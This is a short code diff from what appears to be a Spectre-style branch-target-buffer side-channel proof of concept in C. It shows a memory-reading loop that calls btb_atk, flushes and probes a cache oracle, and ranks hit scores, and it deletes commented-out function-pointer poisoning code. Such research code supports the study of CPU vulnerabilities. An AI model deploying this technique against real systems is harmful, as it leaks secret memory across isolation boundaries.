@@ -11,8 +11,7 @@
 #define CACHE_MISS 80
 #define PAGESIZE 4096
 //uint8_t useless[50]; // int is 4 bytes: need a 33-byte or greater offset for the thing to work
-//int (*fp1)(char *info);
-//int (**fp2)(char *info);
+
 char *oracle_block;
 int junk;
 int* results;
@@ -30,28 +29,6 @@ void readMemoryByte(char *ctl, uint8_t value[2], int score[2]){
     for (tries = 19; tries > 0; tries--){
         _mm_mfence();
         btb_atk(ctl);
-        /* fp1 = &attacker;
-        fp2 = &fp1;
-
-        _mm_mfence();
-        for (i = 0; i < 50; i++){
-            junk ^= victim(&trash,0);
-        }
-
-        _mm_mfence();
-
-        flush(oracle_block, PAGESIZE);
-        _mm_mfence();
-        
-        fp1 = &safe;
-        fp2 = &fp1;
-        _mm_mfence();
-
-        _mm_clflush((void*)fp1);
-        _mm_clflush((void*)fp2);
-        _mm_mfence();
-        junk ^= victim(ctl,0); */
-        //junk ^= victim(&sec2,0);
         _mm_mfence();
         probe(oracle_block,80,PAGESIZE,results);
         // locate top two results
